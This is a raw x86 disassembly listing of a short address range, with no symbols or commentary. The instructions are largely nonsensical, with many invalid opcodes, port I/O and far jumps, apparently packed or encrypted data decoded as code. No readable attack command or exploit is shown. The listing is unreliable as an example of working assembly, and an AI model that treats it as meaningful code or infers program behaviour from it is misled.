  41eb40:	inc    eax
  41eb41:	inc    ebp
  41eb42:	cdq    
  41eb43:	mov    eax,0x526f8e47
  41eb48:	xchg   ebx,eax
  41eb49:	adc    eax,0x5a1ff1f0
  41eb4e:	mov    esi,0x3a933a94
  41eb53:	icebp  
  41eb54:	push   ebx
  41eb55:	adc    ebx,DWORD PTR [ebp+0x4d87021f]
  41eb5b:	imul   ebx,DWORD PTR [eax],0x6c
  41eb5e:	(bad)  
  41eb5f:	(bad)  
  41eb60:	outs   dx,BYTE PTR ds:[esi]
  41eb61:	ins    DWORD PTR es:[edi],dx
  41eb62:	lea    ebx,[ebx-0xd]
  41eb65:	jne    0x41eb77
  41eb67:	pushf  
  41eb68:	dec    ebx
  41eb69:	xchg   esp,eax
  41eb6a:	inc    esi
  41eb6b:	ffreep st(6)
  41eb6d:	inc    edi
  41eb6e:	mov    dl,0x43
  41eb70:	pop    ecx
  41eb71:	xchg   BYTE PTR [ebx],al
  41eb73:	lahf   
  41eb74:	lds    edi,FWORD PTR [edi-0x73]
  41eb77:	mov    dl,BYTE PTR ds:0x86a61ea
  41eb7d:	pop    eax
  41eb7e:	cmp    al,0xaa
  41eb80:	data16 jecxz 0x41ebf5
  41eb83:	addr16 push es
  41eb85:	jp     0x41ebde
  41eb87:	jno    0x41eb9b
  41eb89:	xchg   al,al
  41eb8b:	jb     0x41eb91
  41eb8d:	outs   dx,DWORD PTR ds:[esi]
  41eb8e:	xor    ah,ch
  41eb90:	or     al,0xe8
  41eb92:	pop    eax
  41eb93:	(bad)  
  41eb95:	scas   eax,DWORD PTR es:[edi]
  41eb96:	pop    edi
  41eb97:	dec    ebp
  41eb98:	addr16 (bad) 
  41eb9a:	xor    DWORD PTR [ebp-0x15062d1a],ebx
  41eba0:	cmp    eax,0x42a9005c
  41eba5:	xor    ah,BYTE PTR [ecx-0x31]
  41eba8:	stos   DWORD PTR es:[edi],eax
  41eba9:	mov    esi,DWORD PTR [ebp+0x46815ac5]
  41ebaf:	mov    dh,0xcd
  41ebb1:	retf   
  41ebb2:	addr16 cdq 
  41ebb4:	add    eax,0xfc83b500
  41ebb9:	push   cs
  41ebba:	cmp    ecx,edx
  41ebbc:	mov    dh,0xbd
  41ebbf:	rcr    DWORD PTR [esi+0x7934d653],cl
  41ebc5:	test   edi,edi
  41ebc7:	aas    
  41ebc8:	adc    al,0x66
  41ebca:	icebp  
  41ebcb:	inc    ebp
  41ebcc:	adc    DWORD PTR [edx-0x1b],0x61
  41ebd0:	js     0x41eba0
  41ebd2:	js     0x41ec01
  41ebd4:	call   0xaa2f763f
  41ebd9:	push   cs
  41ebda:	mov    eax,ds:0xa127407d
  41ebdf:	xchg   edx,eax
  41ebe0:	mov    al,ds:0x24f06893
  41ebe5:	nop
  41ebe6:	xchg   esi,eax
  41ebe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebe8:	jle    0x41ebc4
  41ebea:	mov    bh,0xe0
  41ebec:	daa    
  41ebed:	cdq    
  41ebee:	xchg   edx,eax
  41ebef:	add    bh,cl
  41ebf1:	xor    cl,cl
  41ebf3:	(bad)  
  41ebf4:	dec    ebp
  41ebf5:	retf   0x6872
  41ebf8:	push   ebx
  41ebf9:	aam    0x9c
  41ebfb:	mov    ds:0x5d6b44de,al
  41ec00:	(bad)  
  41ec01:	dec    ecx
  41ec02:	loop   0x41ec38
  41ec04:	shr    DWORD PTR [edx],1
  41ec06:	std    
  41ec07:	adc    BYTE PTR [ecx+edx*4+0x7d],al
  41ec0b:	sub    BYTE PTR [ebp+ebp*2+0x2a848058],0xf6
  41ec13:	inc    ecx
  41ec14:	jnp    0x41ebed
  41ec16:	popf   
  41ec17:	sbb    DWORD PTR [ebx+ebx*4],ebp
  41ec1a:	jecxz  0x41ebda
  41ec1c:	retf   0x3120
  41ec1f:	fld    QWORD PTR [esi-0x1596f13e]
  41ec25:	pusha  
  41ec26:	nop
  41ec27:	mov    ebx,esi
  41ec29:	lods   al,BYTE PTR ds:[esi]
  41ec2a:	xor    ecx,DWORD PTR [edi]
  41ec2c:	lock mov eax,0x9a6b888e
  41ec32:	fs cwde 
  41ec34:	push   cs
  41ec35:	mov    ebp,DWORD PTR [ebp+0x7b7fac6b]
  41ec3b:	jbe    0x41ebca
  41ec3d:	jbe    0x41ec59
  41ec3f:	fcomp  st(7)
  41ec41:	dec    edx
  41ec42:	cmp    al,0x2b
  41ec44:	retf   0xc295
  41ec47:	or     BYTE PTR [ecx-0x2149434f],bh
  41ec4d:	outs   dx,BYTE PTR ds:[esi]
  41ec4e:	cwde   
  41ec4f:	call   0x31e4ce75
  41ec54:	mov    ds:0x89cdfa74,al
  41ec59:	adc    BYTE PTR [esi+0x18],ch
  41ec5c:	fsub   QWORD PTR [ebp+0xf]
  41ec5f:	(bad)  
  41ec60:	fldln2 
  41ec62:	stc    
  41ec63:	in     al,0x71
  41ec65:	add    eax,0x873b5635
  41ec6a:	in     eax,dx
  41ec6b:	inc    esp
  41ec6c:	test   DWORD PTR [esi],ebp
  41ec6e:	pop    ss
  41ec6f:	ins    BYTE PTR es:[edi],dx
  41ec70:	imul   DWORD PTR [ebp+0x6d16d7c8]
  41ec76:	enter  0x60e3,0x9
  41ec7a:	jmp    0x63c6:0xbc683991
  41ec81:	outs   dx,BYTE PTR ds:[esi]
  41ec82:	and    BYTE PTR [edx-0x1360aa58],0x7
  41ec89:	int3   
  41ec8a:	ror    DWORD PTR [ecx+0xfb031bb],cl
  41ec90:	in     al,dx
  41ec91:	mov    dl,0x32
  41ec93:	scas   al,BYTE PTR es:[edi]
  41ec94:	jmp    0x41eca8
  41ec96:	mov    edi,DWORD PTR [edi]
  41ec98:	aad    0x7e
  41ec9a:	xor    DWORD PTR [esi+esi*1-0x5c],esi
  41ec9e:	adc    eax,0x8feda29d
  41eca3:	dec    BYTE PTR [ecx-0x39]
  41eca6:	out    dx,eax
  41eca7:	popf   
  41eca8:	cld    
  41eca9:	jge    0x41ecf4
  41ecab:	push   edx
  41ecac:	jge    0x41ecec
  41ecae:	cld    
  41ecaf:	mov    edi,ss
  41ecb1:	fcom   st(3)
  41ecb3:	jg     0x41ecbe
  41ecb5:	push   0x99d23d7e
  41ecba:	mov    eax,0xbf49678b
  41ecbf:	cmp    edi,ebp
  41ecc1:	xchg   BYTE PTR [ebp-0x7],dl
  41ecc4:	xor    BYTE PTR [ecx],ah
  41ecc6:	sbb    eax,0x2b5d599b
  41eccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eccc:	adc    DWORD PTR [eax-0x42],ebp
  41eccf:	and    ebx,edi
  41ecd1:	xchg   edi,eax
  41ecd2:	jp     0x41ec82
  41ecd4:	das    
  41ecd5:	dec    esi
  41ecd6:	iret   
  41ecd7:	std    
  41ecd8:	mov    ch,0x32
  41ecda:	mov    eax,0x15365c2a
  41ecdf:	pop    edi
  41ece0:	nop
  41ece1:	and    BYTE PTR [esi],cl
  41ece3:	jl     0x41eca1
  41ece5:	lea    edi,[eax-0x79]
  41ece8:	sbb    cl,BYTE PTR [eax+edi*4+0x35]
  41ecec:	jne    0x41ec91
  41ecee:	dec    edx
  41ecef:	enter  0xe25,0x85
  41ecf3:	mov    eax,0xc21f741d
  41ecf8:	sbb    al,0x76
  41ecfa:	in     eax,dx
  41ecfb:	cdq    
  41ecfc:	rol    DWORD PTR [ebx-0x3f0df9ec],0xaf
  41ed03:	dec    ecx
  41ed04:	add    DWORD PTR [ecx+0x1868dc75],ebx
  41ed0a:	stc    
  41ed0b:	dec    ecx
  41ed0c:	enter  0xc811,0x64
  41ed10:	adc    eax,0x45ce51a6
  41ed15:	add    eax,0x8bf2a0bb
  41ed1a:	inc    edi
  41ed1b:	ud0    edx,DWORD PTR [edx-0xa]
  41ed1f:	icebp  
  41ed20:	bound  ecx,QWORD PTR [eax+0x54]
  41ed23:	(bad)  
  41ed24:	ficomp DWORD PTR [ebx]
  41ed26:	inc    edi
  41ed27:	and    al,0x38
  41ed29:	push   ebp
  41ed2a:	dec    edx
  41ed2b:	test   DWORD PTR [ecx],esp
  41ed2d:	xchg   esp,eax
  41ed2e:	pop    edx
  41ed2f:	xchg   edx,eax
  41ed30:	xchg   esp,eax
  41ed31:	add    bh,BYTE PTR [esi-0x70661284]
  41ed37:	mov    cl,0x4e
  41ed39:	clc    
  41ed3a:	adc    eax,DWORD PTR [esi]
  41ed3c:	fwait
  41ed3d:	shl    DWORD PTR [edx-0x18a5e0a7],1
  41ed43:	dec    ebx
  41ed44:	cmc    
  41ed45:	xor    ebx,DWORD PTR [ecx-0x6c5d864e]
  41ed4b:	xor    DWORD PTR [ecx-0x6d],0x8d735a43
  41ed52:	data16 xlat BYTE PTR ds:[ebx]
  41ed54:	je     0x41ed54
  41ed56:	dec    ebp
  41ed57:	iret   
  41ed58:	call   0x95d04a4f
  41ed5d:	dec    eax
  41ed5e:	or     eax,0x3fe031b8
  41ed63:	xor    al,0xf3
  41ed65:	imul   DWORD PTR [ebp+ecx*4-0x24b9cc23]
  41ed6c:	int    0x79
  41ed6e:	leave  
  41ed6f:	xchg   esp,eax
  41ed70:	dec    edx
  41ed71:	jae    0x41edc4
  41ed73:	mov    DWORD PTR [esp+edi*4+0x21],ebp
  41ed77:	xchg   edx,eax
  41ed78:	fisttp QWORD PTR [edi-0x2c75ef60]
  41ed7e:	inc    esi
  41ed7f:	mov    eax,0x592450cd
  41ed84:	(bad)  
  41ed85:	xlat   BYTE PTR ds:[ebx]
  41ed86:	aas    
  41ed87:	out    dx,eax
  41ed88:	mov    al,0x2b
  41ed8a:	loope  0x41ee03
  41ed8c:	cmc    
  41ed8d:	fnsave [eax-0x78f73471]
  41ed93:	retf   0x42a0
  41ed96:	add    eax,0x17019b1c
  41ed9b:	xchg   ecx,eax
  41ed9c:	xor    eax,0xdbf6fb81
  41eda1:	(bad)  
  41eda2:	mov    ebx,0x6d26a015
  41eda7:	aad    0x26
  41eda9:	xchg   ebp,eax
  41edaa:	dec    edi
  41edab:	stc    
  41edac:	sub    al,0x45
  41edae:	inc    ebx
  41edaf:	xchg   ebx,eax
  41edb0:	cmp    eax,0x4f45821b
  41edb5:	sets   BYTE PTR [ecx+eiz*2-0x15]
  41edba:	js     0x41ee14
  41edbc:	enter  0x1102,0x4
  41edc0:	dec    edx
  41edc1:	jg     0x41ee23
  41edc3:	mov    eax,0xd01dd3a4
  41edc8:	jp     0x41ee17
  41edca:	mov    bl,0x53
  41edcc:	mov    ebp,0xe59bfaee
  41edd1:	sar    BYTE PTR [ebp+0x4c],0x14
  41edd5:	jb     0x41edd6
  41edd7:	popa   
  41edd8:	adc    eax,0x3bae8eec
  41eddd:	rcl    BYTE PTR [edi+0x38],1
  41ede0:	(bad)  
  41ede1:	data16 sbb dl,al
  41ede4:	call   DWORD PTR [ecx]
  41ede6:	gs mov cl,0x1
  41ede9:	aas    
  41edea:	sub    edi,DWORD PTR [edi]
  41edec:	int    0x8
  41edee:	mov    ecx,0xca11c2f3
  41edf3:	add    dl,BYTE PTR [ebp+edi*4+0x22]
  41edf7:	ss inc ebx
  41edf9:	or     bl,0xa
  41edfc:	jmp    0x41eda5
  41edfe:	stos   DWORD PTR es:[edi],eax
  41edff:	mov    edi,DWORD PTR [ecx]
  41ee01:	inc    ebx
  41ee02:	cmp    ebx,DWORD PTR [eax]
  41ee04:	outs   dx,DWORD PTR ds:[esi]
  41ee05:	add    eax,0x6a6275e5
  41ee0a:	mov    edx,0x8bd7942
  41ee0f:	je     0x41ee50
  41ee11:	fild   QWORD PTR ds:0x917e5e29
  41ee17:	xchg   ebp,eax
  41ee18:	not    BYTE PTR [edi]
  41ee1a:	xor    al,0x79
  41ee1c:	adc    BYTE PTR [ecx],cl
  41ee1e:	into   
  41ee1f:	mov    ds:0x51ec48fa,al
  41ee24:	daa    
  41ee25:	adc    edi,DWORD PTR [ecx]
  41ee27:	xchg   ecx,eax
  41ee28:	fst    st(6)
  41ee2a:	fwait
  41ee2b:	popa   
  41ee2c:	fmul   DWORD PTR [edx+0x1a239a2d]
  41ee32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee33:	(bad)  
  41ee34:	lea    esi,[eax+0x50]
  41ee37:	imul   edx,eax,0xa1255e27
  41ee3d:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee3f:	(bad)  
  41ee41:	or     BYTE PTR [ecx],bl
  41ee43:	and    esi,DWORD PTR [ecx-0x6]
  41ee46:	pop    esp
  41ee47:	xchg   DWORD PTR ss:[ecx+0x65c16ab1],ebp
  41ee4e:	pop    DWORD PTR [ebx+edi*2]
  41ee51:	cmp    esi,DWORD PTR [esi+0x21]
  41ee54:	in     al,0x52
  41ee56:	jnp    0x41ee6f
  41ee58:	or     BYTE PTR [edx],ah
  41ee5a:	adc    al,0x77
  41ee5c:	mov    ?,WORD PTR [ebp-0x70]
  41ee5f:	xor    eax,0xe71a6264
  41ee64:	ret    
  41ee65:	(bad)  
  41ee67:	jp     0x41ee4c
  41ee69:	aad    0x67
  41ee6b:	mov    esp,0x4998acf6
  41ee70:	sti    
  41ee71:	ja     0x41eeaf
  41ee73:	aas    
  41ee74:	dec    ebp
  41ee75:	mov    al,BYTE PTR [ebx]
  41ee77:	jae    0x41eecd
  41ee79:	dec    ecx
  41ee7a:	cs push edx
  41ee7c:	mov    ebp,0x50e00a3b
  41ee81:	mov    eax,ds:0x5a78985d
  41ee86:	xchg   BYTE PTR [ecx-0x1dbc3ec0],ah
  41ee8c:	icebp  
  41ee8d:	jl     0x41eea2
  41ee8f:	daa    
  41ee90:	xor    eax,0xffffffa3
  41ee93:	pop    ebp
  41ee94:	and    al,0xa2
  41ee96:	mov    dh,0x84
  41ee98:	adc    DWORD PTR [edx],0xffffffb4
  41ee9b:	stos   BYTE PTR es:[edi],al
  41ee9c:	out    dx,al
  41ee9d:	sbb    eax,0x6fa31189
  41eea2:	stos   BYTE PTR es:[edi],al
  41eea3:	in     eax,dx
  41eea4:	test   eax,0x318d5730
  41eea9:	pop    ebx
  41eeaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeab:	add    BYTE PTR [edi-0x1a11f04d],cl
  41eeb1:	mov    edx,0xa04fec73
  41eeb6:	in     eax,dx
  41eeb7:	clc    
  41eeb8:	mov    al,ds:0x13b13587
  41eebd:	push   es
  41eebe:	cmp    ebp,edi
  41eec0:	push   DWORD PTR [edi+0x13]
  41eec3:	retf   
  41eec4:	adc    DWORD PTR [esi],esp
  41eec6:	cdq    
  41eec7:	data16 jns 0x41ef1b
  41eeca:	out    0x29,al
  41eecc:	jge    0x41ee5e
  41eece:	pushf  
  41eecf:	pop    eax
  41eed0:	mov    eax,0x629b960c
  41eed5:	xchg   edx,eax
  41eed6:	mov    eax,gs
  41eed8:	mov    DWORD PTR ds:0x8011cd86,esi
  41eede:	jmp    0x34c5:0x5060da66
  41eee5:	ret    
  41eee6:	in     eax,0x1
  41eee8:	mov    dl,0x6c
  41eeea:	add    DWORD PTR [esi],esi
  41eeec:	and    al,0xd3
  41eeee:	push   edi
  41eeef:	fldcw  WORD PTR [esi-0xe]
  41eef2:	les    edi,FWORD PTR [eax+0x4d]
  41eef5:	icebp  
  41eef6:	(bad)  
  41eef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eef8:	hlt    
  41eef9:	mov    WORD PTR [edi+0x7c],fs
  41eefc:	jns    0x41ef22
  41eefe:	rol    DWORD PTR [edi+0xe],cl
  41ef01:	in     al,dx
  41ef02:	in     eax,dx
  41ef03:	jnp    0x41eea3
  41ef05:	rcl    BYTE PTR [edx+0x7c9a68cd],cl
  41ef0b:	mov    dl,0x98
  41ef0d:	and    al,0xcf
  41ef0f:	in     eax,dx
  41ef10:	bound  ebx,QWORD PTR [edi+0x3b789167]
  41ef16:	cdq    
  41ef17:	xchg   bl,ch
  41ef19:	xchg   esp,eax
  41ef1a:	(bad)
  41ef1d:	imul   bh
  41ef1f:	sbb    DWORD PTR [ebp+eax*4+0x618306b0],edx
  41ef26:	push   eax
  41ef27:	or     al,0xb9
  41ef29:	imul   esp,DWORD PTR [edx-0x54164be5],0x70
  41ef30:	nop
  41ef31:	xchg   edx,eax
  41ef32:	cmc    
  41ef33:	loope  0x41ef55
  41ef35:	cwde   
  41ef36:	sbb    ecx,DWORD PTR [eax+ebp*2]
  41ef39:	addr16 cwde 
  41ef3b:	in     al,0x14
  41ef3d:	push   0xdd384f67
  41ef42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef43:	dec    edx
  41ef44:	loopne 0x41ef0e
  41ef46:	xchg   edx,eax
  41ef47:	jmp    0xf241:0xe7a78494
  41ef4e:	jle    0x41ef9a
  41ef50:	loope  0x41eeeb
  41ef52:	xchg   esi,eax
  41ef53:	pop    esi
  41ef54:	jecxz  0x41efb9
  41ef56:	mov    dh,0xc9
  41ef58:	xchg   esp,eax
  41ef59:	or     eax,0x6b9fb674
  41ef5e:	pop    esp
  41ef5f:	xchg   DWORD PTR [edx],ebx
  41ef61:	or     DWORD PTR [edx+0x34],esi
  41ef64:	push   ds
  41ef65:	test   DWORD PTR [ebp+0x75c085bc],eax
  41ef6b:	das    
  41ef6c:	mov    cl,0x6e
  41ef6e:	in     al,0xbe
  41ef70:	leave  
  41ef71:	push   ebp
  41ef72:	in     al,0x2e
  41ef74:	cmp    DWORD PTR [ebp+0x1b1d9e06],0xffffffd1
  41ef7b:	in     eax,dx
  41ef7c:	fxch   st(2)
  41ef7e:	ud1    esp,DWORD PTR [edx-0x64]
  41ef82:	call   0x7cc86cd5
  41ef87:	icebp  
  41ef88:	repnz test al,0x91
  41ef8b:	loop   0x41ef6f
  41ef8d:	ds (bad) 
  41ef8f:	xor    al,BYTE PTR [edx+ecx*2+0x5218e4d9]
  41ef96:	shl    BYTE PTR [eax-0x9e610dc],1
  41ef9c:	add    DWORD PTR [edx],0xffffffc8
  41ef9f:	or     al,0xd0
  41efa1:	lea    ebp,[ecx+0xefa8138]
  41efa7:	bound  edx,QWORD PTR [ebx]
  41efa9:	test   al,0x12
  41efab:	mov    ebp,0x62f05e4
  41efb0:	jmp    0x2ab1fe24
  41efb5:	jl     0x41f003
  41efb7:	call   0x79fc0775
  41efbc:	fsub   st(3),st
  41efbe:	xchg   ebx,eax
  41efbf:	adc    dl,BYTE PTR [edi]
  41efc1:	in     al,dx
  41efc2:	nop
  41efc3:	fsub   DWORD PTR [esi+0xe9eab1]
  41efc9:	mov    cl,bh
  41efcb:	xor    eax,0xcb606579
  41efd0:	jnp    0x41ef6f
  41efd2:	xchg   esp,eax
  41efd3:	adc    edx,DWORD PTR [eax]
  41efd5:	int    0x6f
  41efd7:	mov    al,ds:0x88327f53
  41efdc:	cmc    
  41efdd:	jg     0x41f00c
  41efdf:	aas    
  41efe0:	repnz jmp 0xc08:0xf240b050
  41efe8:	xchg   ebx,eax
  41efe9:	scas   eax,DWORD PTR es:[edi]
  41efea:	outs   dx,DWORD PTR ds:[esi]
  41efeb:	and    al,0xf4
  41efed:	and    esp,DWORD PTR [edx+0x68eb32e3]
  41eff3:	movhlps xmm4,xmm4
  41eff6:	sti    
  41eff7:	push   0xe0cf47e3
  41effc:	dec    eax
  41effd:	mov    ?,esi
  41efff:	(bad)  
  41f001:	jle    0x41efb9
  41f003:	popf   
  41f004:	cmp    bh,ch
  41f006:	les    ebp,FWORD PTR [ecx+0x78]
  41f009:	fimul  WORD PTR [ebp-0x792e46b9]
  41f00f:	jecxz  0x41f053
  41f011:	xor    esi,DWORD PTR [ebx-0x46]
  41f014:	add    al,0x2c
  41f016:	cmp    eax,DWORD PTR [ebx-0x33]
  41f019:	mov    ebx,0x6dcc7901
  41f01e:	and    edi,DWORD PTR [eax*2-0x6bd81e0c]
  41f025:	inc    ebp
  41f026:	add    bh,bl
  41f028:	(bad)  
  41f02a:	lock jns 0x41f016
  41f02d:	(bad)  
  41f02e:	jecxz  0x41f037
  41f030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f031:	inc    eax
  41f032:	pop    ss
  41f033:	js     0x41f054
  41f035:	(bad)  
  41f037:	xchg   esp,eax
  41f038:	inc    eax
  41f039:	or     al,0x85
  41f03b:	pop    ds
  41f03c:	pop    esi
  41f03d:	dec    esp
  41f03e:	or     ebx,esi
  41f040:	lods   eax,DWORD PTR ds:[esi]
  41f041:	call   0x158e3c1a
  41f046:	pop    ss
  41f047:	cmc    
  41f048:	push   cs
  41f049:	or     al,0x87
  41f04b:	push   esp
  41f04c:	mov    ch,BYTE PTR [eax-0x6]
  41f04f:	sub    ch,BYTE PTR [ebx-0x1cdd694]
  41f055:	rcl    BYTE PTR [ebx+0x2cb9332b],1
  41f05b:	xchg   edx,eax
  41f05c:	test   al,0xf
  41f05e:	dec    ebx
  41f05f:	mov    al,0xd6
  41f061:	adc    ecx,esp
  41f063:	ins    BYTE PTR es:[edi],dx
  41f064:	push   ecx
  41f065:	push   esp
  41f066:	add    eax,0x9ec14c31
  41f06b:	sbb    al,0x28
  41f06d:	push   ebp
  41f06e:	(bad)  
  41f06f:	xchg   ebp,eax
  41f070:	xor    DWORD PTR ds:0xa60ed7c0,0xb5b2ea69
  41f07a:	fst    st(6)
  41f07c:	(bad)  
  41f07d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f07e:	adc    edi,esp
  41f080:	or     edx,eax
  41f082:	dec    edi
  41f083:	push   ecx
  41f084:	mov    ds:0x15a3a8,eax
  41f089:	pop    ds
  41f08a:	mov    bh,BYTE PTR [ebp-0x7869722b]
  41f090:	mov    gs,ecx
  41f092:	mov    ebp,0x67577f16
  41f097:	adc    bh,BYTE PTR [esi-0x6f460839]
  41f09d:	mov    WORD PTR [edx-0x5557220e],?
  41f0a3:	xchg   edi,eax
  41f0a4:	(bad)  
  41f0a5:	scas   al,BYTE PTR es:[edi]
  41f0a6:	sahf   
  41f0a7:	and    eax,0x978c0f3
  41f0ac:	pop    edi
  41f0ad:	xor    eax,0x58b0b8c5
  41f0b2:	push   ebp
  41f0b3:	test   al,0x9f
  41f0b5:	ins    BYTE PTR es:[edi],dx
  41f0b6:	js     0x41f047
  41f0b8:	cmp    al,0x55
  41f0ba:	adc    dl,0x7d
  41f0bd:	mov    dl,0xfc
  41f0bf:	clc    
  41f0c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0c1:	in     al,dx
  41f0c2:	(bad)  
  41f0c3:	test   eax,0x8a77963f
  41f0c8:	cli    
  41f0c9:	stos   DWORD PTR es:[edi],eax
  41f0ca:	pop    esp
  41f0cb:	push   edx
  41f0cc:	add    BYTE PTR [edx+0x614a0066],bh
  41f0d2:	(bad)  
  41f0d3:	adc    DWORD PTR [eax-0x767470f],edx
  41f0d9:	mov    bl,0x4d
  41f0db:	adc    eax,0x383a39c
  41f0e0:	test   al,0xc2
  41f0e2:	retf   
  41f0e3:	sub    edi,DWORD PTR [edi-0x6b]
  41f0e6:	ins    BYTE PTR es:[edi],dx
  41f0e7:	push   cs
  41f0e8:	jl     0x41f0e3
  41f0ea:	mov    ebp,0x2f72bc56
  41f0ef:	outs   dx,DWORD PTR ds:[esi]
  41f0f0:	test   ebp,0x9df7cd71
  41f0f6:	cdq    
  41f0f7:	xor    al,0xe1
  41f0f9:	mov    dl,0xd6
  41f0fb:	jne    0x41f0f4
  41f0fd:	fisttp QWORD PTR [ebx]
  41f0ff:	jb     0x41f11d
  41f101:	add    al,0x2b
  41f103:	lods   eax,DWORD PTR ds:[esi]
  41f104:	mov    WORD PTR [esi],fs
  41f106:	mov    al,0x6e
  41f108:	mov    edi,0xc01d4445
  41f10d:	and    al,BYTE PTR [ebx+0x3f8d5884]
  41f113:	or     eax,0x46756fd5
  41f118:	test   DWORD PTR [esi-0x4d823eca],edi
  41f11e:	leave  
  41f11f:	sti    
  41f120:	pop    es
  41f121:	dec    eax
  41f122:	cmp    cl,BYTE PTR [ebx]
  41f124:	dec    esp
  41f125:	push   esp
  41f126:	cmp    BYTE PTR [edx-0x27e7f2d7],dl
  41f12c:	cs ret 0x6630
  41f130:	jbe    0x41f0b2
  41f132:	pushf  
  41f133:	sbb    DWORD PTR [ebx],edi
  41f135:	push   eax
  41f136:	jne    0x41f0eb
  41f138:	stos   BYTE PTR es:[edi],al
  41f139:	xchg   ebp,eax
  41f13a:	ja     0x41f199
  41f13c:	or     dh,BYTE PTR [edx+edx*8+0xa9461]
  41f143:	push   ds
  41f144:	in     eax,0xfc
  41f146:	inc    ecx
  41f147:	push   es
  41f148:	and    bl,BYTE PTR [ecx-0x7ecf2adc]
  41f14e:	inc    edi
  41f14f:	mov    dh,0x72
  41f151:	ds push ebx
  41f153:	push   esi
  41f154:	loop   0x41f1a3
  41f156:	push   es
  41f157:	dec    ebx
  41f158:	(bad)  
  41f159:	xor    BYTE PTR [edi+0x958857c],al
  41f15f:	push   esp
  41f160:	loopne 0x41f1c7
  41f162:	lock dec eax
  41f164:	lods   eax,DWORD PTR ds:[esi]
  41f165:	cmp    WORD PTR [esi+0x766f09a4],cx
  41f16c:	fmul   st,st(3)
  41f16e:	clc    
  41f16f:	adc    BYTE PTR [esi],dh
  41f171:	and    BYTE PTR [esi+0x51079b60],0xcc
  41f178:	jp     0x41f1d8
  41f17a:	xchg   ebp,eax
  41f17b:	(bad)  
  41f17c:	sub    ah,BYTE PTR [ecx-0x1]
  41f17f:	(bad)  
  41f180:	push   edi
  41f181:	daa    
  41f182:	sbb    BYTE PTR [ebp-0x75],0x54
  41f186:	fcomp  st(0)
  41f188:	ins    DWORD PTR es:[edi],dx
  41f189:	cli    
  41f18a:	(bad)  
  41f18b:	out    0x48,al
  41f18d:	jl     0x41f186
  41f18f:	imul   edi,eax,0xda602733
  41f195:	mov    edi,0x327b8738
  41f19a:	retf   
  41f19b:	or     dl,BYTE PTR [esi+0x4bc055b1]
  41f1a1:	rcr    DWORD PTR [edx],cl
  41f1a3:	push   esp
  41f1a4:	clc    
  41f1a5:	dec    ebp
  41f1a6:	push   eax
  41f1a7:	call   0xbe48:0x61104cc
  41f1ae:	(bad)  
  41f1af:	sub    eax,0x5926f057
  41f1b4:	mov    cl,0xef
  41f1b6:	sbb    ebp,DWORD PTR [edi+0x135335ab]
  41f1bc:	arpl   WORD PTR [eax+edi*8],cx
  41f1bf:	leave  
  41f1c0:	sub    al,0xe1
  41f1c2:	sub    eax,0x3cb6e70d
  41f1c7:	mov    ds:0x3fcf19a,al
  41f1cc:	and    eax,0x1dd9fc96
  41f1d1:	fcmovbe st,st(6)
  41f1d3:	mov    ch,0x39
  41f1d5:	mov    al,dh
  41f1d7:	(bad)  
  41f1d8:	cmc    
  41f1d9:	in     al,0xb7
  41f1db:	jo     0x41f224
  41f1dd:	addr16 cld 
  41f1df:	xchg   BYTE PTR [edx],cl
  41f1e1:	aaa    
  41f1e2:	rcl    DWORD PTR [ecx-0xb6feba],cl
  41f1e8:	retf   
  41f1e9:	stos   BYTE PTR es:[edi],al
  41f1ea:	or     BYTE PTR gs:[bx+si+0x3a],al
  41f1ef:	sahf   
  41f1f0:	retf   
  41f1f1:	pop    ecx
  41f1f2:	push   edx
  41f1f3:	xor    al,BYTE PTR [edx+0x68321adb]
  41f1f9:	test   DWORD PTR [eax-0x4c],esi
  41f1fc:	cli    
  41f1fd:	xchg   edx,eax
  41f1ff:	jle    0x41f1ec
  41f201:	fbld   TBYTE PTR [ebx+0x7d]
  41f204:	cmp    DWORD PTR [ecx-0x5f],esi
  41f207:	aam    0xb7
  41f209:	push   0xc9c44b97
  41f20e:	mov    ecx,0x38829e4f
  41f213:	sbb    al,0x5a
  41f215:	(bad)  
  41f217:	jmp    0x41f28c
  41f219:	out    0x4f,eax
  41f21b:	xchg   ebp,eax
  41f21c:	leave  
  41f21d:	jo     0x41f1f3
  41f21f:	dec    esp
  41f220:	daa    
  41f221:	xchg   edi,eax
  41f222:	push   edi
  41f223:	xchg   DWORD PTR ds:0x60c106d0,edi
  41f229:	fcomip st,st(0)
  41f22b:	std    
  41f22c:	repz test DWORD PTR [ecx+0xc],esi
  41f230:	xchg   BYTE PTR [ebp+0x41d89792],cl
  41f236:	mov    esi,DWORD PTR [ecx+esi*4+0x22]
  41f23a:	popa   
  41f23b:	out    dx,eax
  41f23c:	dec    ecx
  41f23d:	das    
  41f23e:	xor    BYTE PTR [ebx-0x63],bl
  41f241:	sbb    eax,0x2b5feda5
  41f246:	mov    DWORD PTR [eax-0x6e],esi
  41f249:	push   ss
  41f24a:	sub    al,0xbf
  41f24c:	cdq    
  41f24d:	sub    BYTE PTR [edx+0x9],bl
  41f250:	stos   BYTE PTR es:[edi],al
  41f251:	push   ecx
  41f252:	loope  0x41f272
  41f254:	dec    edi
  41f255:	push   esi
  41f256:	scas   al,BYTE PTR es:[edi]
  41f257:	pop    eax
  41f258:	bnd jb 0x41f248
  41f25b:	out    dx,al
  41f25c:	push   ss
  41f25d:	(bad)  
  41f25e:	in     eax,dx
  41f25f:	out    dx,al
  41f260:	jne    0x41f287
  41f262:	jmp    0x1925:0xf13640ac
  41f269:	push   edx
  41f26a:	pop    esi
  41f26c:	enter  0x8e89,0x2
  41f270:	in     eax,dx
  41f271:	and    DWORD PTR [eax],esp
  41f273:	mov    WORD PTR cs:[ebx+edi*2],ds
  41f277:	xor    al,cl
  41f279:	cdq    
  41f27a:	sbb    eax,0x4ecad19e
  41f27f:	xlat   BYTE PTR ds:[ebx]
  41f280:	or     DWORD PTR [eax-0x59],ebp
  41f283:	or     BYTE PTR [eax+esi*8],bh
  41f286:	cld    
  41f287:	jmp    0x41f231
  41f289:	inc    esp
  41f28a:	call   0x240a:0x97ad0af
  41f291:	enter  0xfa53,0xa
